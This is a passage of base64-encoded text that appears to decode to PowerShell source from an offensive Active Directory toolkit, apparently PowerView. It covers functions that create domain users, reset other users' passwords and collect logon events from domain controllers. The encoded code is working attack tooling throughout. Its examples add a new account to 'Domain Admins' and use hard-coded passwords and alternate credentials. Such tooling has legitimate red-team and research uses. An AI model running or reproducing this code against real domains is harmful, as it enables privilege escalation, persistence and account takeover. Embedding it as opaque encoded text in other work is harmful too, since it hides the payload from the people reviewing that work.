maWVkIGRvbWFpbiBjb250ZXh0IHVzaW5nIEdldC1QcmluY2lwYWxDb250ZXh0LgpUaGUgYm91bmQgZG9tYWluIGNvbnRleHQgaXMgdGhlbiB1c2VkIHRvIGNyZWF0ZSBhIG5ldwpEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsIHdpdGggdGhlIHNwZWNpZmllZCB1c2VyIHByb3BlcnRpZXMuCgouUEFSQU1FVEVSIFNhbUFjY291bnROYW1lCgpTcGVjaWZpZXMgdGhlIFNlY3VyaXR5IEFjY291bnQgTWFuYWdlciAoU0FNKSBhY2NvdW50IG5hbWUgb2YgdGhlIHVzZXIgdG8gY3JlYXRlLgpNYXhpbXVtIG9mIDI1NiBjaGFyYWN0ZXJzLiBNYW5kYXRvcnkuCgouUEFSQU1FVEVSIEFjY291bnRQYXNzd29yZAoKU3BlY2lmaWVzIHRoZSBwYXNzd29yZCBmb3IgdGhlIGNyZWF0ZWQgdXNlci4gTWFuZGF0b3J5LgoKLlBBUkFNRVRFUiBOYW1lCgpTcGVjaWZpZXMgdGhlIG5hbWUgb2YgdGhlIHVzZXIgdG8gY3JlYXRlLiBJZiBub3QgcHJvdmlkZWQsIGRlZmF1bHRzIHRvIFNhbUFjY291bnROYW1lLgoKLlBBUkFNRVRFUiBEaXNwbGF5TmFtZQoKU3BlY2lmaWVzIHRoZSBkaXNwbGF5IG5hbWUgb2YgdGhlIHVzZXIgdG8gY3JlYXRlLiBJZiBub3QgcHJvdmlkZWQsIGRlZmF1bHRzIHRvIFNhbUFjY291bnROYW1lLgoKLlBBUkFNRVRFUiBEZXNjcmlwdGlvbgoKU3BlY2lmaWVzIHRoZSBkZXNjcmlwdGlvbiBvZiB0aGUgdXNlciB0byBjcmVhdGUuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIHRvIHNlYXJjaCBmb3IgdXNlci9ncm91cCBwcmluY2lwYWxzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKJFVzZXJQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQpOZXctRG9tYWluVXNlciAtU2FtQWNjb3VudE5hbWUgaGFybWoweTIgLURlc2NyaXB0aW9uICdUaGlzIGlzIGhhcm1qMHknIC1BY2NvdW50UGFzc3dvcmQgJFVzZXJQYXNzd29yZAoKQ3JlYXRlcyB0aGUgJ2hhcm1qMHkyJyB1c2VyIHdpdGggdGhlIHNwZWNpZmllZCBkZXNjcmlwdGlvbiBhbmQgcGFzc3dvcmQuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKJFVzZXJQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokdXNlciA9IE5ldy1Eb21haW5Vc2VyIC1TYW1BY2NvdW50TmFtZSBoYXJtajB5MiAtRGVzY3JpcHRpb24gJ1RoaXMgaXMgaGFybWoweScgLUFjY291bnRQYXNzd29yZCAkVXNlclBhc3N3b3JkIC1DcmVkZW50aWFsICRDcmVkCgpDcmVhdGVzIHRoZSAnaGFybWoweTInIHVzZXIgd2l0aCB0aGUgc3BlY2lmaWVkIGRlc2NyaXB0aW9uIGFuZCBwYXNzd29yZCwgdXNpbmcgdGhlIHNwZWNpZmllZAphbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKJFVzZXJQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQpOZXctRG9tYWluVXNlciAtU2FtQWNjb3VudE5hbWUgYW5keSAtQWNjb3VudFBhc3N3b3JkICRVc2VyUGFzc3dvcmQgLUNyZWRlbnRpYWwgJENyZWQgfCBBZGQtRG9tYWluR3JvdXBNZW1iZXIgJ0RvbWFpbiBBZG1pbnMnIC1DcmVkZW50aWFsICRDcmVkCgpDcmVhdGVzIHRoZSAnYW5keScgdXNlciB3aXRoIHRoZSBzcGVjaWZpZWQgZGVzY3JpcHRpb24gYW5kIHBhc3N3b3JkLCB1c2luZyB0aGUgc3BlY2lmaWVkCmFsdGVybmF0ZSBjcmVkZW50aWFscywgYW5kIGFkZHMgdGhlIHVzZXIgdG8gJ2RvbWFpbiBhZG1pbnMnIHVzaW5nIEFkZC1Eb21haW5Hcm91cE1lbWJlcgphbmQgdGhlIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsCgouTElOSwoKaHR0cDovL3JpY2hhcmRzcG93ZXJzaGVsbGJsb2cud29yZHByZXNzLmNvbS8yMDA4LzA1LzI1L3N5c3RlbS1kaXJlY3RvcnlzZXJ2aWNlcy1hY2NvdW50bWFuYWdlbWVudC8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VTaG91bGRQcm9jZXNzRm9yU3RhdGVDaGFuZ2luZ0Z1bmN0aW9ucycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuVXNlclByaW5jaXBhbCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTGVuZ3RoKDAsIDI1NildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2FtQWNjb3VudE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdQYXNzd29yZCcpXQogICAgICAgIFtTZWN1cml0eS5TZWN1cmVTdHJpbmddCiAgICAgICAgJEFjY291bnRQYXNzd29yZCwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICROYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERpc3BsYXlOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERlc2NyaXB0aW9uLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgJENvbnRleHRBcmd1bWVudHMgPSBAewogICAgICAgICdJZGVudGl0eScgPSAkU2FtQWNjb3VudE5hbWUKICAgIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCgogICAgaWYgKCRDb250ZXh0KSB7CiAgICAgICAgJFVzZXIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuVXNlclByaW5jaXBhbCAtQXJndW1lbnRMaXN0ICgkQ29udGV4dC5Db250ZXh0KQoKICAgICAgICAjIHNldCBhbGwgdGhlIGFwcHJvcHJpYXRlIHVzZXIgcGFyYW1ldGVycwogICAgICAgICRVc2VyLlNhbUFjY291bnROYW1lID0gJENvbnRleHQuSWRlbnRpdHkKICAgICAgICAkVGVtcENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdhJywgJEFjY291bnRQYXNzd29yZCkKICAgICAgICAkVXNlci5TZXRQYXNzd29yZCgkVGVtcENyZWQuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkKICAgICAgICAkVXNlci5FbmFibGVkID0gJFRydWUKICAgICAgICAkVXNlci5QYXNzd29yZE5vdFJlcXVpcmVkID0gJEZhbHNlCgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ05hbWUnXSkgewogICAgICAgICAgICAkVXNlci5OYW1lID0gJE5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRVc2VyLk5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEaXNwbGF5TmFtZSddKSB7CiAgICAgICAgICAgICRVc2VyLkRpc3BsYXlOYW1lID0gJERpc3BsYXlOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVXNlci5EaXNwbGF5TmFtZSA9ICRDb250ZXh0LklkZW50aXR5CiAgICAgICAgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZXNjcmlwdGlvbiddKSB7CiAgICAgICAgICAgICRVc2VyLkRlc2NyaXB0aW9uID0gJERlc2NyaXB0aW9uCiAgICAgICAgfQoKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LURvbWFpblVzZXJdIEF0dGVtcHRpbmcgdG8gY3JlYXRlIHVzZXIgJyRTYW1BY2NvdW50TmFtZSciCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJE51bGwgPSAkVXNlci5TYXZlKCkKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW05ldy1Eb21haW5Vc2VyXSBVc2VyICckU2FtQWNjb3VudE5hbWUnIHN1Y2Nlc3NmdWxseSBjcmVhdGVkIgogICAgICAgICAgICAkVXNlcgogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltOZXctRG9tYWluVXNlcl0gRXJyb3IgY3JlYXRpbmcgdXNlciAnJFNhbUFjY291bnROYW1lJyA6ICRfIgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIFNldC1Eb21haW5Vc2VyUGFzc3dvcmQgewo8IwouU1lOT1BTSVMKClNldHMgdGhlIHBhc3N3b3JkIGZvciBhIGdpdmVuIHVzZXIgaWRlbnRpdHkuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1QcmluY2lwYWxDb250ZXh0ICAKCi5ERVNDUklQVElPTgoKRmlyc3QgYmluZHMgdG8gdGhlIHNwZWNpZmllZCBkb21haW4gY29udGV4dCB1c2luZyBHZXQtUHJpbmNpcGFsQ29udGV4dC4KVGhlIGJvdW5kIGRvbWFpbiBjb250ZXh0IGlzIHRoZW4gdXNlZCB0byBzZWFyY2ggZm9yIHRoZSBzcGVjaWZpZWQgdXNlciAtSWRlbnRpdHksCndoaWNoIHJldHVybnMgYSBEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsIG9iamVjdC4gVGhlClNldFBhc3N3b3JkKCkgZnVuY3Rpb24gaXMgdGhlbiBpbnZva2VkIG9uIHRoZSB1c2VyLCBzZXR0aW5nIHRoZSBwYXNzd29yZCB0byAtQWNjb3VudFBhc3N3b3JkLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSB1c2VyIFNhbUFjY291bnROYW1lIChlLmcuIFVzZXIxKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049dXNlcjEsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTMpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkKc3BlY2lmeWluZyB0aGUgdXNlciB0byByZXNldCB0aGUgcGFzc3dvcmQgZm9yLgoKLlBBUkFNRVRFUiBBY2NvdW50UGFzc3dvcmQKClNwZWNpZmllcyB0aGUgcGFzc3dvcmQgdG8gcmVzZXQgdGhlIHRhcmdldCB1c2VyJ3MgdG8uIE1hbmRhdG9yeS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgdG8gc2VhcmNoIGZvciB0aGUgdXNlciBpZGVudGl0eSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCiRVc2VyUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKU2V0LURvbWFpblVzZXJQYXNzd29yZCAtSWRlbnRpdHkgYW5keSAtQWNjb3VudFBhc3N3b3JkICRVc2VyUGFzc3dvcmQKClJlc2V0cyB0aGUgcGFzc3dvcmQgZm9yICdhbmR5JyB0byB0aGUgcGFzc3dvcmQgc3BlY2lmaWVkLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCiRVc2VyUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKU2V0LURvbWFpblVzZXJQYXNzd29yZCAtSWRlbnRpdHkgYW5keSAtQWNjb3VudFBhc3N3b3JkICRVc2VyUGFzc3dvcmQgLUNyZWRlbnRpYWwgJENyZWQKClJlc2V0cyB0aGUgcGFzc3dvcmQgZm9yICdhbmR5JyB1c2VyaW5nIHRoZSBhbHRlcm5hdGUgY3JlZGVudGlhbHMgc3BlY2lmaWVkLgoKLk9VVFBVVFMKCkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlVzZXJQcmluY2lwYWwKCi5MSU5LCgpodHRwOi8vcmljaGFyZHNwb3dlcnNoZWxsYmxvZy53b3JkcHJlc3MuY29tLzIwMDgvMDUvMjUvc3lzdGVtLWRpcmVjdG9yeXNlcnZpY2VzLWFjY291bnRtYW5hZ2VtZW50LwojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnVXNlck5hbWUnLCAnVXNlcklkZW50aXR5JywgJ1VzZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1Bhc3N3b3JkJyldCiAgICAgICAgW1NlY3VyaXR5LlNlY3VyZVN0cmluZ10KICAgICAgICAkQWNjb3VudFBhc3N3b3JkLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgJENvbnRleHRBcmd1bWVudHMgPSBAeyAnSWRlbnRpdHknID0gJElkZW50aXR5IH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCgogICAgaWYgKCRDb250ZXh0KSB7CiAgICAgICAgJFVzZXIgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlVzZXJQcmluY2lwYWxdOjpGaW5kQnlJZGVudGl0eSgkQ29udGV4dC5Db250ZXh0LCAkSWRlbnRpdHkpCgogICAgICAgIGlmICgkVXNlcikgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gQXR0ZW1wdGluZyB0byBzZXQgdGhlIHBhc3N3b3JkIGZvciB1c2VyICckSWRlbnRpdHknIgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFRlbXBDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnYScsICRBY2NvdW50UGFzc3dvcmQpCiAgICAgICAgICAgICAgICAkVXNlci5TZXRQYXNzd29yZCgkVGVtcENyZWQuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkKCiAgICAgICAgICAgICAgICAkTnVsbCA9ICRVc2VyLlNhdmUoKQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIFBhc3N3b3JkIGZvciB1c2VyICckSWRlbnRpdHknIHN1Y2Nlc3NmdWxseSByZXNldCIKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gRXJyb3Igc2V0dGluZyBwYXNzd29yZCBmb3IgdXNlciAnJElkZW50aXR5JyA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gVW5hYmxlIHRvIGZpbmQgdXNlciAnJElkZW50aXR5JyIKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluVXNlckV2ZW50IHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGUgYWNjb3VudCBsb2dvbiBldmVudHMgKElEIDQ2MjQpIGFuZCBMb2dvbiB3aXRoIGV4cGxpY2l0IGNyZWRlbnRpYWwKZXZlbnRzIChJRCA0NjQ4KSBmcm9tIHRoZSBzcGVjaWZpZWQgaG9zdCAoZGVmYXVsdCBvZiB0aGUgbG9jYWxob3N0KS4KCkF1dGhvcjogTGVlIENocmlzdGVuc2VuIChAdGlma2luXyksIEp1c3RpbiBXYXJuZXIgKEBzaXhkdWIpLCBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB1c2VzIGFuIFhNTCBwYXRoIGZpbHRlciBwYXNzZWQgdG8gR2V0LVdpbkV2ZW50IHRvIHJldHJpZXZlCnNlY3VyaXR5IGV2ZW50cyB3aXRoIElEcyBvZiA0NjI0IChsb2dvbiBldmVudHMpIG9yIDQ2NDggKGV4cGxpY2l0IGNyZWRlbnRpYWwKbG9nb24gZXZlbnRzKSBmcm9tIC1TdGFydFRpbWUgKGRlZmF1bHQgb2Ygbm93LTEgZGF5KSB0byAtRW5kVGltZSAoZGVmYXVsdCBvZiBub3cpLgpBIG1heGltdW0gb2YgLU1heEV2ZW50cyAoZGVmYXVsdCBvZiA1MDAwKSBhcmUgcmV0dXJuZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBjb21wdXRlciBuYW1lIHRvIHJldHJpZXZlIGV2ZW50cyBmcm9tLCBkZWZhdWx0IG9mIGxvY2FsaG9zdC4KCi5QQVJBTUVURVIgU3RhcnRUaW1lCgpUaGUgW0RhdGVUaW1lXSBvYmplY3QgcmVwcmVzZW50aW5nIHRoZSBzdGFydCBvZiB3aGVuIHRvIGNvbGxlY3QgZXZlbnRzLgpEZWZhdWx0IG9mIFtEYXRlVGltZV06Ok5vdy5BZGREYXlzKC0xKS4KCi5QQVJBTUVURVIgRW5kVGltZQoKVGhlIFtEYXRlVGltZV0gb2JqZWN0IHJlcHJlc2VudGluZyB0aGUgZW5kIG9mIHdoZW4gdG8gY29sbGVjdCBldmVudHMuCkRlZmF1bHQgb2YgW0RhdGVUaW1lXTo6Tm93LgoKLlBBUkFNRVRFUiBNYXhFdmVudHMKClRoZSBtYXhpbXVtIG51bWJlciBvZiBldmVudHMgdG8gcmV0cmlldmUuIERlZmF1bHQgb2YgNTAwMC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGNvbXB1dGVyLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyRXZlbnQKClJldHVybiBsb2dvbiBldmVudHMgb24gdGhlIGxvY2FsIG1hY2hpbmUuCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbnRyb2xsZXIgfCBHZXQtRG9tYWluVXNlckV2ZW50IC1TdGFydFRpbWUgKFtEYXRlVGltZV06Ok5vdy5BZGREYXlzKC0zKSkKClJldHVybiBhbGwgbG9nb24gZXZlbnRzIGZyb20gdGhlIGxhc3QgMyBkYXlzIGZyb20gZXZlcnkgZG9tYWluIGNvbnRyb2xsZXIgaW4gdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Vc2VyRXZlbnQgLUNvbXB1dGVyTmFtZSBQUklNQVJZLnRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQgLU1heEV2ZW50cyAxMDAwCgpSZXR1cm4gYSBtYXggb2YgMTAwMCBsb2dvbiBldmVudHMgZnJvbSB0aGUgc3BlY2lmaWVkIG1hY2hpbmUgdXNpbmcgdGhlIHNwZWNpZmllZCBhbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkxvZ29uRXZlbnQKClBvd2VyVmlldy5FeHBsaWNpdENyZWRlbnRpYWxMb2dvbkV2ZW50CgouTElOSwoKaHR0cDovL3d3dy5zaXhkdWIubmV0LzIwMTQvMTEvMDcvb2ZmZW5zaXZlLWV2ZW50LXBhcnNpbmctYnJpbmdpbmctaG9tZS10cm9waGllcy8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2dvbkV2ZW50JyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkV4cGxpY2l0Q3JlZGVudGlhbExvZ29uRXZlbnQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ2Ruc2hvc3RuYW1lJywgJ0hvc3ROYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJEVudjpDT01QVVRFUk5BTUUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRTdGFydFRpbWUgPSBbRGF0ZVRpbWVdOjpOb3cuQWRkRGF5cygtMSksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRFbmRUaW1lID0gW0RhdGVUaW1lXTo6Tm93LAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRNYXhFdmVudHMgPSA1MDAwLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgIyB0aGUgWE1MIGZpbHRlciB3Z